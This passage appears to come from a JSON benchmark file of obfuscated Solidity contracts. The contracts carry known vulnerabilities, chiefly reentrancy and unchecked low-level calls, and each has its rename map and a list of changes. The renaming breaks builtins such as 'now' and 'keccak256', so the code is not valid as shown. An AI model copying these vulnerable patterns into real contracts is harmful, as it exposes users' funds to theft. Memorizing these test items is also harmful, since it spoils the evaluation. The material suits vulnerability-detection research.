      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract Private_Bank\n{\n    mapping (address => uint) public _0xe6e432;\n\n    uint public MinDeposit = 1 ether;\n\n    Log TransferLog;\n\n    function Private_Bank(address _0xdf4907)\n    {\n        TransferLog = Log(_0xdf4907);\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        bool _flag1 = false;\n        // Placeholder for future logic\n        if(msg.value > MinDeposit)\n        {\n            _0xe6e432[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n\n    function CashOut(uint _0x91f022)\n    public\n    payable\n    {\n        bool _flag3 = false;\n        if (false) { revert(); }\n        if(_0x91f022<=_0xe6e432[msg.sender])\n        {\n            if(msg.sender.call.value(_0x91f022)())\n            {\n                _0xe6e432[msg.sender]-=_0x91f022;\n                TransferLog.AddMessage(msg.sender,_0x91f022,\"CashOut\");\n            }\n        }\n    }\n\n    function() public payable{}\n\n}\n\ncontract Log\n{\n\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0xfb9e29,uint _0x120c13,string _0x9e32ce)\n    public\n    {\n        LastMsg.Sender = _0xfb9e29;\n        LastMsg.Time = _0x3c4653;\n        LastMsg.Val = _0x120c13;\n        LastMsg.Data = _0x9e32ce;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "balances": "_0xe6e432",
        "_data": "_0x9e32ce",
        "_adr": "_0xfb9e29",
        "_log": "_0xdf4907",
        "_val": "_0x120c13",
        "_am": "_0x91f022",
        "now": "_0x3c4653"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_032",
      "transformed_id": "ss_l4_medium_sn_ds_032",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract PrivateBank\n{\n    mapping (address => uint) public _0xcb4378;\n\n    uint public MinDeposit = 1 ether;\n\n    Log TransferLog;\n\n    function PrivateBank(address _0x1f1e41)\n    {\n        TransferLog = Log(_0x1f1e41);\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        if(msg.value >= MinDeposit)\n        {\n            _0xcb4378[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n\n    function CashOut(uint _0xd153bc)\n    {\n        if(_0xd153bc<=_0xcb4378[msg.sender])\n        {\n            if(msg.sender.call.value(_0xd153bc)())\n            {\n                _0xcb4378[msg.sender]-=_0xd153bc;\n                TransferLog.AddMessage(msg.sender,_0xd153bc,\"CashOut\");\n            }\n        }\n    }\n\n    function() public payable{}\n\n}\n\ncontract Log\n{\n\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0xcd9660,uint _0x0b2ebf,string _0x05852e)\n    public\n    {\n        // Placeholder for future logic\n        uint256 _unused4 = 0;\n        LastMsg.Sender = _0xcd9660;\n        LastMsg.Time = _0x7e89e0;\n        LastMsg.Val = _0x0b2ebf;\n        LastMsg.Data = _0x05852e;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "balances": "_0xcb4378",
        "_data": "_0x05852e",
        "_adr": "_0xcd9660",
        "_lib": "_0x1f1e41",
        "_val": "_0x0b2ebf",
        "_am": "_0xd153bc",
        "now": "_0x7e89e0"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_033",
      "transformed_id": "ss_l4_medium_sn_ds_033",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract ETH_VAULT\n{\n    mapping (address => uint) public _0x5872c5;\n\n    uint public MinDeposit = 1 ether;\n\n    Log TransferLog;\n\n    function ETH_VAULT(address _0xe5f780)\n    public\n    {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n        TransferLog = Log(_0xe5f780);\n    }\n\n    function Deposit()\n    public\n    payable\n    {\n        bool _flag3 = false;\n        uint256 _unused4 = 0;\n        if(msg.value > MinDeposit)\n        {\n            _0x5872c5[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n\n    function CashOut(uint _0x9fd517)\n    public\n    payable\n    {\n        if(_0x9fd517<=_0x5872c5[msg.sender])\n        {\n            if(msg.sender.call.value(_0x9fd517)())\n            {\n                _0x5872c5[msg.sender]-=_0x9fd517;\n                TransferLog.AddMessage(msg.sender,_0x9fd517,\"CashOut\");\n            }\n        }\n    }\n\n    function() public payable{}\n\n}\n\ncontract Log\n{\n\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0xc29de5,uint _0x24fb88,string _0x3bace6)\n    public\n    {\n        LastMsg.Sender = _0xc29de5;\n        LastMsg.Time = _0xe11356;\n        LastMsg.Val = _0x24fb88;\n        LastMsg.Data = _0x3bace6;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "balances": "_0x5872c5",
        "_data": "_0x3bace6",
        "_adr": "_0xc29de5",
        "_log": "_0xe5f780",
        "_val": "_0x24fb88",
        "_am": "_0x9fd517",
        "now": "_0xe11356"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_034",
      "transformed_id": "ss_l4_medium_sn_ds_034",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract MONEY_BOX\n{\n    struct Holder\n    {\n        uint _0xa7cd53;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    uint public MinSum;\n\n    Log LogFile;\n\n    bool _0xc81686;\n\n    function SetMinSum(uint _0x13706a)\n    public\n    {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        if(_0xc81686)throw;\n        MinSum = _0x13706a;\n    }\n\n    function SetLogFile(address _0xdd452b)\n    public\n    {\n        bool _flag3 = false;\n        if (false) { revert(); }\n        if(_0xc81686)throw;\n        LogFile = Log(_0xdd452b);\n    }\n\n    function Initialized()\n    public\n    {\n        _0xc81686 = true;\n    }\n\n    function Put(uint _0xb4c89d)\n    public\n    payable\n    {\n        var _0x21348b = Acc[msg.sender];\n        _0x21348b.balance += msg.value;\n        if(_0x41c328+_0xb4c89d>_0x21348b._0xa7cd53)_0x21348b._0xa7cd53=_0x41c328+_0xb4c89d;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _0x8dfeb3)\n    public\n    payable\n    {\n        var _0x21348b = Acc[msg.sender];\n        if( _0x21348b.balance>=MinSum && _0x21348b.balance>=_0x8dfeb3 && _0x41c328>_0x21348b._0xa7cd53)\n        {\n            if(msg.sender.call.value(_0x8dfeb3)())\n            {\n                _0x21348b.balance-=_0x8dfeb3;\n                LogFile.AddMessage(msg.sender,_0x8dfeb3,\"Collect\");\n            }\n        }\n    }\n\n    function()\n    public\n    payable\n    {\n        Put(0);\n    }\n\n}\n\ncontract Log\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0xb1f03c,uint _0x13706a,string _0x9746a6)\n    public\n    {\n        LastMsg.Sender = _0xb1f03c;\n        LastMsg.Time = _0x41c328;\n        LastMsg.Val = _0x13706a;\n        LastMsg.Data = _0x9746a6;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "intitalized": "_0xc81686",
        "unlockTime": "_0xa7cd53",
        "_lockTime": "_0xb4c89d",
        "_data": "_0x9746a6",
        "_log": "_0xdd452b",
        "_val": "_0x13706a",
        "_adr": "_0xb1f03c",
        "_am": "_0x8dfeb3",
        "acc": "_0x21348b",
        "now": "_0x41c328"
      },
      "changes": [
        "Renamed 10 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_035",
      "transformed_id": "ss_l4_medium_sn_ds_035",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\n\ncontract WALLET\n{\n    function Put(uint _0xcdb166)\n    public\n    payable\n    {\n        if (false) { revert(); }\n        bool _flag2 = false;\n        var _0xc37754 = Acc[msg.sender];\n        _0xc37754.balance += msg.value;\n        _0xc37754._0x0e17f8 = _0xcdb166>_0x05fc46?_0xcdb166:_0x05fc46;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _0x08b2ff)\n    public\n    payable\n    {\n        // Placeholder for future logic\n        bool _flag4 = false;\n        var _0xc37754 = Acc[msg.sender];\n        if( _0xc37754.balance>=MinSum && _0xc37754.balance>=_0x08b2ff && _0x05fc46>_0xc37754._0x0e17f8)\n        {\n            if(msg.sender.call.value(_0x08b2ff)())\n            {\n                _0xc37754.balance-=_0x08b2ff;\n                LogFile.AddMessage(msg.sender,_0x08b2ff,\"Collect\");\n            }\n        }\n    }\n\n    function()\n    public\n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder\n    {\n        uint _0x0e17f8;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;\n\n    function WALLET(address _0x891ec4) public{\n        if (true) { LogFile = Log(_0x891ec4); }\n    }\n}\n\ncontract Log\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0x885e80,uint _0x2c0b46,string _0x604db1)\n    public\n    {\n        LastMsg.Sender = _0x885e80;\n        LastMsg.Time = _0x05fc46;\n        LastMsg.Val = _0x2c0b46;\n        LastMsg.Data = _0x604db1;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "_unlockTime": "_0xcdb166",
        "unlockTime": "_0x0e17f8",
        "_data": "_0x604db1",
        "_val": "_0x2c0b46",
        "_adr": "_0x885e80",
        "_am": "_0x08b2ff",
        "acc": "_0xc37754",
        "now": "_0x05fc46",
        "log": "_0x891ec4"
      },
      "changes": [
        "Renamed 9 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_036",
      "transformed_id": "ss_l4_medium_sn_ds_036",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\n\ncontract MY_BANK\n{\n    function Put(uint _0x6e8524)\n    public\n    payable\n    {\n        uint256 _unused1 = 0;\n        // Placeholder for future logic\n        var _0xbe641e = Acc[msg.sender];\n        _0xbe641e.balance += msg.value;\n        _0xbe641e._0x3a3373 = _0x6e8524>_0x7c4d3d?_0x6e8524:_0x7c4d3d;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _0x603675)\n    public\n    payable\n    {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n        var _0xbe641e = Acc[msg.sender];\n        if( _0xbe641e.balance>=MinSum && _0xbe641e.balance>=_0x603675 && _0x7c4d3d>_0xbe641e._0x3a3373)\n        {\n            if(msg.sender.call.value(_0x603675)())\n            {\n                _0xbe641e.balance-=_0x603675;\n                LogFile.AddMessage(msg.sender,_0x603675,\"Collect\");\n            }\n        }\n    }\n\n    function()\n    public\n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder\n    {\n        uint _0x3a3373;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;\n\n    function MY_BANK(address _0x477ba3) public{\n        if (1 == 1) { LogFile = Log(_0x477ba3); }\n    }\n}\n\ncontract Log\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _0xcf542b,uint _0x0fdf02,string _0x0abe75)\n    public\n    {\n        LastMsg.Sender = _0xcf542b;\n        LastMsg.Time = _0x7c4d3d;\n        LastMsg.Val = _0x0fdf02;\n        LastMsg.Data = _0x0abe75;\n        History.push(LastMsg);\n    }\n}",
      "rename_map": {
        "_unlockTime": "_0x6e8524",
        "unlockTime": "_0x3a3373",
        "_data": "_0x0abe75",
        "_val": "_0x0fdf02",
        "_adr": "_0xcf542b",
        "_am": "_0x603675",
        "acc": "_0xbe641e",
        "now": "_0x7c4d3d",
        "log": "_0x477ba3"
      },
      "changes": [
        "Renamed 9 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_037",
      "transformed_id": "ss_l4_medium_sn_ds_037",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.0;\ncontract EtherBank{\n    mapping (address => uint) _0x77e55d;\n    function _0xd5b047(address _0x6c8979) constant returns(uint) {\n\t\treturn _0x77e55d[_0x6c8979];\n\t}\n\n\tfunction _0x6df812() {\n\t\t_0x77e55d[msg.sender] += msg.value;\n\t}\n\n\tfunction _0x4a044f() {\n\t\tuint _0x016514 = _0x77e55d[msg.sender];\n\t\tif (!(msg.sender.call.value(_0x016514)())) { throw; }\n\t\t_0x77e55d[msg.sender] = 0;\n\t}\n}",
      "rename_map": {
        "amountToWithdraw": "_0x016514",
        "withdrawBalance": "_0x4a044f",
        "userBalances": "_0x77e55d",
        "addToBalance": "_0x6df812",
        "getBalance": "_0xd5b047",
        "user": "_0x6c8979"
      },
      "changes": [
        "Renamed 6 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_038",
      "transformed_id": "ss_l4_medium_sn_ds_038",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.10;\n\ncontract EtherStore {\n\n    uint256 public _0xfad133 = 1 ether;\n    mapping(address => uint256) public _0x985cc1;\n    mapping(address => uint256) public _0x7ac085;\n\n    function _0x5ab786() public payable {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n        _0x7ac085[msg.sender] += msg.value;\n    }\n\n    function _0x118acc (uint256 _0x0d67dc) public {\n        bool _flag3 = false;\n        bool _flag4 = false;\n        require(_0x7ac085[msg.sender] >= _0x0d67dc);\n        // limit the withdrawal\n        require(_0x0d67dc <= _0xfad133);\n        // limit the time allowed to withdraw\n        require(_0xfa6975 >= _0x985cc1[msg.sender] + 1 weeks);\n        require(msg.sender.call.value(_0x0d67dc)());\n        _0x7ac085[msg.sender] -= _0x0d67dc;\n        _0x985cc1[msg.sender] = _0xfa6975;\n    }\n }\n",
      "rename_map": {
        "lastWithdrawTime": "_0x985cc1",
        "withdrawalLimit": "_0xfad133",
        "_weiToWithdraw": "_0x0d67dc",
        "withdrawFunds": "_0x118acc",
        "depositFunds": "_0x5ab786",
        "balances": "_0x7ac085",
        "now": "_0xfa6975"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_039",
      "transformed_id": "ss_l4_medium_sn_ds_039",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract ModifierBank {\n  mapping (address => uint) public _0x2a7f5b;\n  string constant _0x0f603d = \"Nu Token\";\n\n  //If a contract has a zero balance and supports the token give them some token\n  function _0xa6e31e() _0x1e1f96 _0x85d218  public{\n    _0x2a7f5b[msg.sender] += 20;\n  }\n\n  //Checks that the contract responds the way we want\n  modifier _0x85d218() {\n    require(_0x140f37(abi._0x7f57a2(\"Nu Token\")) == Bank(msg.sender)._0x85d218());\n    _;\n  }\n  //Checks that the caller has a zero balance\n  modifier _0x1e1f96 {\n      require(_0x2a7f5b[msg.sender] == 0);\n      _;\n  }\n}\n\ncontract Bank{\n    function _0x85d218() external pure returns(bytes32){\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n        return(_0x140f37(abi._0x7f57a2(\"Nu Token\")));\n    }\n}\n\ncontract _0xeb7c52 {\n    bool _0x6358a1;\n    function _0x85d218() external returns(bytes32){\n        uint256 _unused3 = 0;\n        // Placeholder for future logic\n        if(!_0x6358a1){\n            _0x6358a1 = true;\n            ModifierBank(msg.sender)._0xa6e31e();\n        }\n        return(_0x140f37(abi._0x7f57a2(\"Nu Token\")));\n    }\n    function call(address _0x3aff30) public{\n        ModifierBank(_0x3aff30)._0xa6e31e();\n    }\n}",
      "rename_map": {
        "supportsToken": "_0x85d218",
        "hasBeenCalled": "_0x6358a1",
        "tokenBalance": "_0x2a7f5b",
        "encodePacked": "_0x7f57a2",
        "hasNoBalance": "_0x1e1f96",
        "keccak256": "_0x140f37",
        "executor": "_0xeb7c52",
        "airDrop": "_0xa6e31e",
        "token": "_0x3aff30",
        "name": "_0x0f603d"
      },
      "changes": [
        "Renamed 10 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_040",
      "transformed_id": "ss_l4_medium_sn_ds_040",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\ncontract TokenVault {\n\n  mapping(address => uint) public _0xd419c2;\n\n  function _0x7195d0(address _0xdfff75) public payable {\n        bool _flag1 = false;\n        bool _flag2 = false;\n    _0xd419c2[_0xdfff75] += msg.value;\n  }\n\n  function _0xbaa667(address _0x9561f8) public view returns (uint balance) {\n        if (false) { revert(); }\n        if (false) { revert(); }\n    return _0xd419c2[_0x9561f8];\n  }\n\n  function _0x9a3241(uint _0x45ae2c) public {\n    if(_0xd419c2[msg.sender] >= _0x45ae2c) {\n      if(msg.sender.call.value(_0x45ae2c)()) {\n        _0x45ae2c;\n      }\n      _0xd419c2[msg.sender] -= _0x45ae2c;\n    }\n  }\n\n  function() public payable {}\n}",
      "rename_map": {
        "balanceOf": "_0xbaa667",
        "balances": "_0xd419c2",
        "withdraw": "_0x9a3241",
        "_amount": "_0x45ae2c",
        "donate": "_0x7195d0",
        "_who": "_0x9561f8",
        "_to": "_0xdfff75"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_041",
      "transformed_id": "ss_l4_medium_sn_ds_041",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract BonusVault{\n\n    mapping (address => uint) private _0x295f74;\n    mapping (address => bool) private _0xeea1bf;\n    mapping (address => uint) private _0xa49ddc;\n\n    function _0xd88223(address _0xa2d2e7) public {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        uint _0x14d9e5 = _0xa49ddc[_0xa2d2e7];\n        _0xa49ddc[_0xa2d2e7] = 0;\n        (bool _0x1e588b, ) = _0xa2d2e7.call.value(_0x14d9e5)(\"\");\n        require(_0x1e588b);\n    }\n\n    function _0xa77e8c(address _0xa2d2e7) public {\n        // Placeholder for future logic\n        uint256 _unused4 = 0;\n        require(!_0xeea1bf[_0xa2d2e7]); // Each recipient should only be able to claim the bonus once\n\n        _0xa49ddc[_0xa2d2e7] += 100;\n        _0xd88223(_0xa2d2e7); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.\n        _0xeea1bf[_0xa2d2e7] = true;\n    }\n}",
      "rename_map": {
        "getFirstWithdrawalBonus": "_0xa77e8c",
        "amountToWithdraw": "_0x14d9e5",
        "withdrawReward": "_0xd88223",
        "claimedBonus": "_0xeea1bf",
        "userBalances": "_0x295f74",
        "rewardsForA": "_0xa49ddc",
        "recipient": "_0xa2d2e7",
        "success": "_0x1e588b"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_042",
      "transformed_id": "ss_l4_medium_sn_ds_042",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract CrossFunctionVault {\n\n    mapping (address => uint) private _0x748058;\n\n    function transfer(address _0xbadfe9, uint _0x344e98) {\n        if (_0x748058[msg.sender] >= _0x344e98) {\n            _0x748058[_0xbadfe9] += _0x344e98;\n            _0x748058[msg.sender] -= _0x344e98;\n        }\n    }\n\n    function _0x3554fe() public {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n        uint _0x52ce14 = _0x748058[msg.sender];\n        (bool _0xee5196, ) = msg.sender.call.value(_0x52ce14)(\"\");\n        require(_0xee5196);\n        _0x748058[msg.sender] = 0;\n    }\n}",
      "rename_map": {
        "amountToWithdraw": "_0x52ce14",
        "withdrawBalance": "_0x3554fe",
        "userBalances": "_0x748058",
        "success": "_0xee5196",
        "amount": "_0x344e98",
        "to": "_0xbadfe9"
      },
      "changes": [
        "Renamed 6 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_043",
      "transformed_id": "ss_l4_medium_sn_ds_043",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract CommunityVault {\n    mapping (address => uint) _0x49eb6e;\n    uint balance;\n\n    function _0x5f1c88() public {\n        bool _flag1 = false;\n        bool _flag2 = false;\n        uint _0x18079e = _0x49eb6e[msg.sender];\n        if (_0x18079e > 0) {\n            balance -= _0x18079e;\n            bool _0x21eef0 = msg.sender.call.value(_0x18079e)();\n            require (_0x21eef0);\n            _0x49eb6e[msg.sender] = 0;\n        }\n    }\n\n    function _0x5f3b54() public payable {\n        // Placeholder for future logic\n        uint256 _unused4 = 0;\n        _0x49eb6e[msg.sender] += msg.value;\n        balance += msg.value;\n    }\n}",
      "rename_map": {
        "withdrawAll": "_0x5f1c88",
        "callResult": "_0x21eef0",
        "deposit": "_0x5f3b54",
        "oCredit": "_0x18079e",
        "credit": "_0x49eb6e"
      },
      "changes": [
        "Renamed 5 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_044",
      "transformed_id": "ss_l4_medium_sn_ds_044",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.5.0;\n\ncontract SimpleVault {\n\n    mapping (address => uint) private _0x668901;\n\n    function _0x5aaf47() public {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n        uint _0xa6b6d2 = _0x668901[msg.sender];\n        (bool _0x8bd881, ) = msg.sender.call.value(_0xa6b6d2)(\"\");\n        require(_0x8bd881);\n        _0x668901[msg.sender] = 0;\n    }\n}",
      "rename_map": {
        "amountToWithdraw": "_0xa6b6d2",
        "withdrawBalance": "_0x5aaf47",
        "userBalances": "_0x668901",
        "success": "_0x8bd881"
      },
      "changes": [
        "Renamed 4 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_045",
      "transformed_id": "ss_l4_medium_sn_ds_045",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.15;\n\n contract TokenVault {\n     mapping (address => uint) _0xc92041;\n\n     function _0x9fc033(address u) constant returns(uint){\n         return _0xc92041[u];\n     }\n\n     function _0x208db7() payable{\n         _0xc92041[msg.sender] += msg.value;\n     }\n\n     function _0x1af7f1(){\n         // send userBalance[msg.sender] ethers to msg.sender\n         // if mgs.sender is a contract, it will call its fallback function\n         if( ! (msg.sender.call.value(_0xc92041[msg.sender])() ) ){\n             throw;\n         }\n         _0xc92041[msg.sender] = 0;\n     }\n }",
      "rename_map": {
        "withdrawBalance": "_0x1af7f1",
        "addToBalance": "_0x208db7",
        "userBalance": "_0xc92041",
        "getBalance": "_0x9fc033"
      },
      "changes": [
        "Renamed 4 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_046",
      "transformed_id": "ss_l4_medium_sn_ds_046",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.2;\n\ncontract SimpleDAO {\n  mapping (address => uint) public _0x4da166;\n\n  function _0xef7502(address _0x78e508) payable {\n    _0x4da166[_0x78e508] += msg.value;\n  }\n\n  function _0x64be58(uint _0x340322) {\n    if (_0x4da166[msg.sender]>= _0x340322) {\n      bool _0xeb3822 = msg.sender.call.value(_0x340322)();\n      _0x4da166[msg.sender]-=_0x340322;\n    }\n  }\n\n  function _0xad87b7(address _0x78e508) returns (uint){\n    return _0x4da166[_0x78e508];\n  }\n}",
      "rename_map": {
        "queryCredit": "_0xad87b7",
        "withdraw": "_0x64be58",
        "amount": "_0x340322",
        "donate": "_0xef7502",
        "credit": "_0x4da166",
        "res": "_0xeb3822",
        "to": "_0x78e508"
      },
      "changes": [
        "Renamed 7 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_047",
      "transformed_id": "ss_l4_medium_sn_ds_047",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.10;\n\ncontract Caller {\n    function _0x473b7f(address a) {\n        a.call();\n    }\n}",
      "rename_map": {
        "callAddress": "_0x473b7f"
      },
      "changes": [
        "Renamed 1 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_048",
      "transformed_id": "ss_l4_medium_sn_ds_048",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.25;\ncontract _0xef0d69{\n    function transfer(address from,address _0xb7b392,address[] _0x95997f,uint[] v)public returns (bool){\n        require(_0x95997f.length > 0);\n        bytes4 _0x4cfa11=bytes4(_0xefffd7(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_0x95997f.length;i++){\n            _0xb7b392.call(_0x4cfa11,from,_0x95997f[i],v[i]);\n        }\n        return true;\n    }\n}",
      "rename_map": {
        "keccak256": "_0xefffd7",
        "caddress": "_0xb7b392",
        "_tos": "_0x95997f",
        "demo": "_0xef0d69",
        "id": "_0x4cfa11"
      },
      "changes": [
        "Renamed 5 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_049",
      "transformed_id": "ss_l4_medium_sn_ds_049",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address _0xd34176;\n    address _0x155d11 = msg.sender;\n\n    function _0x4eb446(address _0xfd6a22)\n    public\n    _0x12175f\n    {\n        uint256 _unused1 = 0;\n        // Placeholder for future logic\n        _0xd34176 = _0xfd6a22;\n    }\n\n    function _0x7720e1()\n    public\n    {\n        bool _flag3 = false;\n        // Placeholder for future logic\n        if(msg.sender==_0xd34176)\n        {\n            _0x155d11=_0xd34176;\n        }\n    }\n\n    modifier _0x12175f\n    {\n        if(_0x155d11 == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address _0x155d11 = msg.sender;\n    function WithdrawToken(address _0x271731, uint256 _0xbc71ee,address _0xf73c6d)\n    public\n    _0x12175f\n    {\n        _0x271731.call(bytes4(_0x97ed30(\"transfer(address,uint256)\")),_0xf73c6d,_0xbc71ee);\n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n\n     ///Constructor\n    function _0xd27dfb()\n    public\n    {\n        _0x155d11 = msg.sender;\n        MinDeposit = 1 ether;\n    }\n\n    function()\n    payable\n    {\n        Deposit();\n    }\n\n    function Deposit()\n    payable\n    {\n        if(msg.value>MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n\n    function WitdrawTokenToHolder(address _0xfb378b,address _0x40eaf8,uint _0x442b26)\n    public\n    _0x12175f\n    {\n        if(Holders[_0xfb378b]>0)\n        {\n            Holders[_0xfb378b]=0;\n            WithdrawToken(_0x40eaf8,_0x442b26,_0xfb378b);\n        }\n    }\n\n    function WithdrawToHolder(address _0x2131c1, uint _0xaf8791)\n    public\n    _0x12175f\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_0x2131c1]>=_0xaf8791)\n            